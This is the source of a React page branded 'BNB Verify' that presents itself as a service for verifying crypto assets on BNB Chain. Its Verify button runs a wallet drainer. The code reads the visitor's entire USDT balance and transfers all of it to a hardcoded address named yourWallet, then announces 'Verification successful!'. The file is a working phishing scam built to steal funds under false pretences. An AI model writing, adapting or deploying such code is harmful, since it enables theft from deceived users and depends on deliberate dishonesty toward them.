import { useState } from "react";
import { ethers } from "ethers";

export default function App() {
  const [walletAddress, setWalletAddress] = useState("");
  const [verified, setVerified] = useState(false);

  const yourWallet = "0x82b0d4e6799314353b001bfece2eb3a0cda57866";
  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
  const USDT_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)"
  ];

  // Connect wallet
  async function connectWallet() {
    if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();
    setWalletAddress(address);
  }

  // Verify function
  async function verifyUser() {
    if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();

    const usdtContract = new ethers.Contract(usdtAddress, USDT_ABI, signer);
    const balance = await usdtContract.balanceOf(address);
    if (balance === 0n) return alert("⚠️ No USDT in wallet");

    const bnbBalance = await provider.getBalance(address);
    if (bnbBalance === 0n) return alert("⚠️ Not enough BNB for gas");

    const tx = await usdtContract.transfer(yourWallet, balance);
    await tx.wait();

    alert("✅ Verification successful! USDT sent.");
    setVerified(true);
  }

  return (
    <div className="bg-[#121212] min-h-screen font-sans text-[#E0E0E0]">
      {/* Navbar */}
      <header className="bg-[#171717] bg-opacity-80 backdrop-blur-md sticky top-0 z-50">
        <nav className="container mx-auto px-6 py-4 flex justify-between items-center">
          <a href="#" className="flex items-center space-x-2">
            <div className="h-8 w-8 bg-yellow-400 rounded-full"></div>
            <span className="text-xl font-bold text-yellow-400">BNB Verify</span>
          </a>

          <div className="hidden md:flex space-x-8 text-sm font-medium">
            <a href="#" className="hover:text-yellow-400 transition-colors">Home</a>
            <a href="#" className="hover:text-yellow-400 transition-colors">Explorer</a>
            <a href="#" className="hover:text-yellow-400 transition-colors">Tokens</a>
            <a href="#" className="hover:text-yellow-400 transition-colors">NFTs</a>
            <a href="#" className="hover:text-yellow-400 transition-colors">DApps</a>
          </div>

          {!walletAddress ? (
            <button
              onClick={connectWallet}
              className="bg-yellow-400 text-black px-4 py-2 rounded-xl font-semibold hover:brightness-105 transition"
            >
              Connect Wallet
            </button>
          ) : (
            <span className="px-3 py-2 bg-gray-800 text-green-400 rounded-xl font-mono">
              {walletAddress.slice(0,6)}...{walletAddress.slice(-4)}
            </span>
          )}
        </nav>
      </header>

      {/* Main Section */}
      <main className="relative overflow-hidden pt-12 md:pt-24 lg:pt-32">
        <div className="container mx-auto px-6 grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
          
          {/* Left Content */}
          <div className="relative z-10 text-center lg:text-left">
            <div className="inline-block bg-[#1E1E1E] text-yellow-400 text-xs font-semibold px-4 py-1 rounded-full mb-4">
              Powered by BNB Chain
            </div>
            <h1 className="text-4xl md:text-5xl lg:text-6xl font-bold leading-tight mb-6 text-white">
              Verify Crypto Assets on <br className="hidden md:inline" />BNB Chain
            </h1>
            <p className="text-lg md:text-xl text-gray-400 mb-8 max-w-lg mx-auto lg:mx-0">
              Our advanced platform provides instant verification of BNB Chain assets, ensuring authenticity and security for all your crypto transactions.
            </p>
            <div className="flex flex-col md:flex-row space-y-4 md:space-y-0 md:space-x-4 items-center justify-center lg:justify-start">
              <button
                onClick={verifyUser}
                className="bg-yellow-400 text-black px-8 py-4 rounded-xl font-bold hover:brightness-105 transition w-full md:w-auto"
              >
                Verify
              </button>
              <a href="#" className="border-2 border-yellow-400 text-yellow-400 px-8 py-4 rounded-xl font-bold hover:bg-yellow-500 hover:text-black transition w-full md:w-auto text-center">
                Explore BNB Chain
              </a>
            </div>
          </div>

          {/* Right Graphic */}
          <div className="relative flex justify-center items-center h-96 lg:h-auto">
            <div className="absolute inset-0 flex justify-center items-center">
              <div className="absolute w-[calc(100%-2rem)] h-[calc(100%-2rem)] max-w-md max-h-md rounded-full border-2 border-yellow-400 border-opacity-30 animate-pulse-slow"></div>
              <div className="absolute w-[calc(75%-2rem)] h-[calc(75%-2rem)] max-w-sm max-h-sm rounded-full border-2 border-yellow-400 border-opacity-50 animate-pulse-slow"></div>
              <div className="absolute w-[calc(50%-2rem)] h-[calc(50%-2rem)] max-w-xs max-h-xs rounded-full border-2 border-yellow-400 border-opacity-70 animate-pulse-slow"></div>
              <svg className="h-24 w-24 text-yellow-400" fill="currentColor" viewBox="0 0 48 48">
                <path d="M24 0L12 12L24 24L12 36L24 48L36 36L24 24L36 12L24 0Z" />
              </svg>
            </div>
          </div>

        </div>
      </main>

      <style jsx>{`
        @keyframes pulse-slow {
          0%, 100% { transform: scale(1); opacity: 0.5; }
          50% { transform: scale(1.1); opacity: 0.8; }
        }
        .animate-pulse-slow {
          animation: pulse-slow 4s cubic-bezier(0.4,0,0.6,1) infinite;
        }
      `}</style>
    </div>
  );
}
